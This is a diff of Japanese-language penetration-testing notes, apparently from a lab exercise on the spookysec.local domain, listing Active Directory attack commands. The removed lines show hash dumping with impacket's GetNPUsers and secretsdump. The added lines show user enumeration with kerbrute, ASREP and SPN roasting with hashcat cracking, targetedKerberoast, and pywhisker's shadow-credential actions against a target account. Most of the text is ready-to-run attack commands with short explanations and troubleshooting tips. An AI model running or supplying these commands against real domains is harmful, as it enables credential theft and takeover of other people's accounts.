@@ -1,12 +1,37 @@
-//認証情報の窃取
+//kerbrute
 ./kerbrute_linux_amd64 userenum -d spookysec.local --dc sppkysec.local user.txt #kerbruteはgitからダウンロード　
 -usernum #ユーザの列挙
 -d # ドメイン名の指定
 --dc #ドメコンの指定
 
-//impacket
-/usr/share/doc/python3-impacket/examples/ #impacketのパス
-./GetNPUsers.py <domain name>/<user name>　#TGTを不正に入手
-./secretsdump.py -just-dc-ntlm <user>@<domain> -outputfile <file name> #複製権限があるユーザで全員のNTLMをダンプ
+//targetedKerberoast
+//例
+kerberoast ldap all <ldap_connection_url> -o ldapenum #LDAP経由で脆弱なユーザーを探す
+kerberoast asreproast <DC_ip> -t ldapenum_asrep_users.txt #ldapenum_asrep_users.txtファイル内のユーザーに対してASREPローストを使用する
+kerberoast spnroast <kerberos_connection_url> -t ldapenum_spn_users.txt #ldapenum_spn_users.txtファイル内のユーザーに対してSPNローストを使用する
+hashcatなどで SPNローストとASPREPローストの出力をクラックする
+kerberoast brute <realm> <dc_ip> <targets> <options> #総当たりでユーザの列挙
+./targetedKerberoast.py -v -d <domain> -u <user> -p <pass> #権限のあるユーザでTGTの作成
+＊＊エラーがでたとき＊＊
+kerberoastを実行したときKRB_AP_ERR_SKEW(Clock skew too great)というエラーが出たときは、相手サーバとこちらの時刻同期がズレすぎているということなので以下を実施する
+systemctl stop systemd-timesyncd #いったん自分の時刻規制をとめて
+sudo ntpdate -u <IP> #ntpdateで相手と同期
 
-
+//pywhisker
+pyWhisker は、ターゲットの msDs-KeyCredentialLink 属性に対してさまざまなアクションを実行するために使用できる
+list:現在のすべての KeyCredentials ID と作成時刻を一覧表示
+add:新しいKeyCredentialをmsDs-KeyCredentialLinkに追加
+spray:新しいKeyCredentialをスプレーしてmsDs-KeyCredentialLinkに追加する
+remove:KeyCredentialをmsDs-KeyCredentialLinkから消す
+clear:すべてのKeyCredentialsを削除します
+info:KeyCredential 構造に含まれるすべての情報を出力します
+export:msDs-KeyCredentialLinkJSON内のすべてのKeyCredentialsをエクスポートします
+import:msDs-KeyCredentialLinkJSONファイルからのKeyCredentialsで上書きする
+//使用例
+python3 pywhisker.py -d <domain> -u <user> -p <pass> --target <target user> --action "add"
+＊＊エラーがでたとき＊＊
+ModuleNotFoundErrorがでたときは下記を実行
+wget http://launchpadlibrarian.net/732112002/python3-cryptography_41.0.7-4ubuntu0.1_amd64.deb
+sudo dpkg -i python3-cryptography_41.0.7-4ubuntu0.1_amd64.deb
+wget http://launchpadlibrarian.net/715850281/python3-openssl_24.0.0-1_all.deb
+sudo dpkg -i python3-openssl_24.0.0-1_all.deb
